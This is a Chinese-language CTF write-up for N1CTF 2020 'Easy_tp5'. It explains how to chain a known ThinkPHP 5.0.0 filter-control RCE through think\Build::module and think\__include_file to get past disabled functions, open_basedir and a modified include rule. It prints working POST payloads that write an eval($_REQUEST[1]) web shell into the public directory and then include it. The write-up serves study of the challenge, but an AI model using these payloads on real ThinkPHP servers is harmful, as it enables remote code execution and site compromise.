# N1CTF 2020 Easy_tp5 Writeup

## 题目简述

题目基于 ThinkPHP 5.0.0，并保留了能够控制请求过滤器的已知 RCE 入口，但同时加入三层限制：危险的一参数函数被禁用，`open_basedir` 限制在站点目录，且框架的包含函数被修改为“去掉末尾四个字符再追加 `.php`”。预期解法不是直接执行系统命令，而是先调用框架内部方法写入 PHP 文件，再借修改后的加载器包含该文件。

## 解题过程

### 确认一参数函数调用原语

ThinkPHP 的请求处理允许通过 `_method`、`filter[]`、`get[]` 等参数控制过滤函数及其参数。正常的命令执行函数已被禁用，但原语仍能调用一个“只接收一个字符串参数”的静态方法。源码中的 `think\Build::module($module)` 符合这个形态，并会继续调用 `buildHello()` 创建模块控制器文件。

### 用模块名塑造文件路径和内容

`Build::module()` 会依据模块名递归创建目录并写入控制器模板。攻击者可把路径穿越和 PHP 代码放入模块名，使最终文件落到可写的 `public` 目录。Linux 上递归 `mkdir` 产生的 warning 会被框架转换为异常，导致后续 `file_put_contents()` 不执行，因此 payload 中还要先调整错误报告级别，抑制该 warning。

公开赛后脚本使用下面的请求，把模块路径穿越到 `public`，并让生成模板中出现可执行 PHP：

```text
_method=__construct&filter[]=think\Build::module&method=GET&get[]=index//../../public/?><?php eval($_REQUEST[1]);
```

在官方预期构造中，还可把 `error_reporting(0)` 的等价表达式并入模块名，避免递归建目录的 warning 被框架转成异常。最终文件位于 `public` 下。若只求 flag，写入内容可以缩减为文件读取，无需再依赖被禁用的命令执行函数：

```php
<?php echo file_get_contents('/flag'); ?>
```

### 绕过修改后的包含规则

题目把加载器中的包含包装器改成类似下面的行为：

```php
include substr($file, 0, -4) . '.php';
```

因此直接访问新文件并不稳定，需要再次使用过滤器原语调用 `think\__include_file`，并让传入路径在“删四字节、补 `.php`”后恰好指向写入文件。与上述公开构造配套的包含请求为：

```text
_method=__construct&filter[]=think\__include_file&method=GET&get[]=/var/www/html/public/?><?php eval($_REQUEST[1]);/controller/Index.php
```

包含发生在 PHP 解释器中，文件内容随即执行并输出 flag。这里的路径穿越、文件名尾部和被删掉的四个字符必须根据实际生成结果逐字核对，不能照搬不同环境的绝对路径。

## 方法总结

当常见框架 RCE 被 `disable_functions` 或 `open_basedir` 限制时，应把现有原语重新描述成“可调用的一参数函数”，再在框架代码中寻找满足签名的写文件、包含文件或模板编译方法。源码中看似普通的构建辅助函数，一旦参数来自请求，就可能把受限函数调用升级为可控 PHP 文件执行。
